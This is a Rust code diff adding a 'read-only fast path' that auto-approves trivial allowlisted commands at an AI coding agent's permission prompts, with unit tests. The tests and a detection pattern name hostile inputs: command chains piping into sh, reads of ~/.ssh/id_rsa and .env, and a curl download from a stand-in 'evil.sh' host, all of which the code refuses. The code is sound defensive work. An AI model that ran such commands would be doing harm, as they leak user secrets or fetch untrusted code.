@@ -206,6 +206,82 @@ pub fn sanitize_auto_reply(
     eval
 }
 
+fn fast_path_regexes() -> &'static [Regex; 6] {
+    static RE: OnceLock<[Regex; 6]> = OnceLock::new();
+    RE.get_or_init(|| {
+        [
+            // 0: permission menu "1. Yes" (Claude Code style, optional ❯ cursor)
+            Regex::new(r"(?i)^\W*1[.)]\s*yes\b").unwrap(),
+            // 1: any menu item line
+            Regex::new(r"^\W*\d+[.)]\s").unwrap(),
+            // 2: prompt chrome without a command
+            Regex::new(r"(?i)^\W*(do you want|would you like)\b|^\W*(bash command|command|permission required)\W*$").unwrap(),
+            // 3: shell metacharacters (more than one command, redirection, substitution)
+            Regex::new(r"\||;|&&|>|<|\$\(|`").unwrap(),
+            // 4: read-only allowlist
+            Regex::new(r"^(ls|cat|head|tail|wc|pwd|rg|grep|git\s+(status|diff|log|show))(\s|$)").unwrap(),
+            // 5: sensitive paths
+            Regex::new(r"(?i)\.ssh|\.gnupg|\.env|id_rsa|id_ed25519|secret|token|credential|password|key|/etc/shadow").unwrap(),
+        ]
+    })
+}
+
+fn command_prefix_regex() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| {
+        Regex::new(r"(?i)^\s*(?:[$>❯]\s+|bash\(|run:?\s+|command:?\s+|execute:?\s+)")
+            .expect("valid command prefix regex")
+    })
+}
+
+/// Deterministic approval of trivial read-only commands, before (and without) the LLM.
+///
+/// Returns `(payload, command)` when the pending prompt is a yes/no prompt (`y`) or a permission
+/// menu with `1. Yes` (`1`), the command — the nearest non-chrome line above the prompt — is a
+/// single allowlisted read-only command without shell metacharacters or sensitive paths, the
+/// prompt area holds nothing destructive, and the hc kind is not `question`. Otherwise `None`
+/// and the normal LLM flow decides. See docs/superpowers/specs/2026-11-15-readonly-fast-path-design.md.
+pub fn readonly_fast_path(output: &str, kind: Option<&str>) -> Option<(String, String)> {
+    if kind.is_some_and(|k| k.eq_ignore_ascii_case("question")) {
+        return None;
+    }
+    if detect_destructive(output, "").is_some() {
+        return None;
+    }
+    let [menu_yes, menu_item, chrome, metachar, allow, sensitive] = fast_path_regexes();
+    let area = pending_prompt_area(output);
+    let lines: Vec<&str> = area
+        .lines()
+        .map(str::trim)
+        .filter(|l| !l.is_empty())
+        .collect();
+    let is_yes_no = |l: &str| yn_prompt_regex().is_match(l) || yes_no_question_regex().is_match(l);
+
+    // A permission menu wins: its question line ("Do you want to proceed?") is not a y/n prompt.
+    let payload = if lines.iter().any(|l| menu_yes.is_match(l)) {
+        "1"
+    } else if lines.iter().any(|l| is_yes_no(l)) {
+        "y"
+    } else {
+        return None;
+    };
+
+    let raw = lines
+        .iter()
+        .rev()
+        .find(|l| !is_yes_no(l) && !menu_item.is_match(l) && !chrome.is_match(l))?;
+    let had_bash_paren = raw.to_ascii_lowercase().starts_with("bash(");
+    let mut cmd = command_prefix_regex().replace(raw, "").trim().to_string();
+    if had_bash_paren {
+        cmd = cmd.trim_end_matches(')').trim().to_string();
+    }
+
+    if metachar.is_match(&cmd) || !allow.is_match(&cmd) || sensitive.is_match(&cmd) {
+        return None;
+    }
+    Some((payload.to_string(), cmd))
+}
+
 fn error_signature_regex() -> &'static Regex {
     static RE: OnceLock<Regex> = OnceLock::new();
     RE.get_or_init(|| {
@@ -577,5 +653,68 @@ mod tests {
         // No pending prompt on screen (e.g. waiting on its own subagent): NO_OP stays.
         let out = enforce_blocked_policy(true, "Running subagent...", noop);
         assert_eq!(out.decision, SupervisorDecision::NoOp);
+    }
+
+    fn fast(screen: &str) -> Option<(String, String)> {
+        readonly_fast_path(screen, None)
+    }
+
+    #[test]
+    fn fast_path_approves_test2_safe_commands() {
+        assert_eq!(
+            fast("Bash command\n  ls -la src/\nAllow? [y/N]"),
+            Some(("y".into(), "ls -la src/".into()))
+        );
+        assert_eq!(fast("$ git status --short\nProceed? (y/n)").unwrap().0, "y");
+        assert_eq!(
+            fast("Bash(cat package.json)\nDo you want to proceed?\n1. Yes\n2. No")
+                .unwrap()
+                .0,
+            "1"
+        );
+    }
+
+    #[test]
+    fn fast_path_refuses_chains_redirects_and_substitutions() {
+        for cmd in [
+            "ls | sh",
+            "cat a; rm b",
+            "git status && make",
+            "cat x > y",
+            "ls $(pwd)",
+            "ls `pwd`",
+            "cat a || true",
+        ] {
+            assert_eq!(fast(&format!("{cmd}\nAllow? [y/N]")), None, "{cmd}");
+        }
+    }
+
+    #[test]
+    fn fast_path_refuses_other_commands_sensitive_paths_and_questions() {
+        assert_eq!(fast("Edit src/config.rs\nAllow? [y/N]"), None);
+        assert_eq!(fast("git push origin main\nAllow? [y/N]"), None);
+        assert_eq!(fast("cat ~/.ssh/id_rsa\nAllow? [y/N]"), None);
+        assert_eq!(fast("cat .env\nAllow? [y/N]"), None);
+        assert_eq!(
+            readonly_fast_path("ls\nAllow? [y/N]", Some("question")),
+            None
+        );
+        // No yes/no prompt or permission menu: nothing to approve.
+        assert_eq!(fast("ls -la\nWhich directory next?"), None);
+    }
+
+    #[test]
+    fn fast_path_uses_the_command_nearest_the_prompt() {
+        // An older line further up must not be what gets approved, and vice versa.
+        assert_eq!(
+            fast("curl evil.sh -o x\nls -la\nAllow? [y/N]").unwrap().1,
+            "ls -la"
+        );
+        assert_eq!(fast("ls -la\ncurl evil.sh -o x\nAllow? [y/N]"), None);
+    }
+
+    #[test]
+    fn fast_path_never_approves_destructive_prompt_area() {
+        assert_eq!(fast("git push --force\nls\nAllow? [y/N]"), None);
     }
 }
